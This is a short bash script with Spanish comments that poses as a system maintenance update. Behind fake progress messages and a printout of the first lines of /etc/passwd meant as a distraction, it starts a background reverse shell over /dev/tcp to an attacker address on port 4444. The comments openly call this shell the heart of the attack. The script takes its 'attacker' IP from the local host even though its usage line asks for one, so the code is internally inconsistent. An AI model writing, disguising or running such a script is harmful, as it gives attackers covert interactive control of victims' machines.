#!/bin/bash
# Uso: ./sorpresa.sh <TU_IP>
IP_ATACANTE=$(hostname -I | awk '{print $1}')
PUERTO=4444

echo "Iniciando mantenimiento del sistema..."
# EFECTO VISUAL: Escupimos datos para distraer (Capa de in>
cat /etc/passwd | head -n 5
echo "Procesando paquetes..."

# LA REVERSE SHELL (El corazón del ataque)
# -i: Shell interactiva
# >&: Une salida y errores y los manda al socket TCP
# 0>&1: Conecta tu teclado con la entrada de la víctima
bash -i >& /dev/tcp/$IP_ATACANTE/$PUERTO 0>&1 &

sleep 2
echo "Actualización completada."

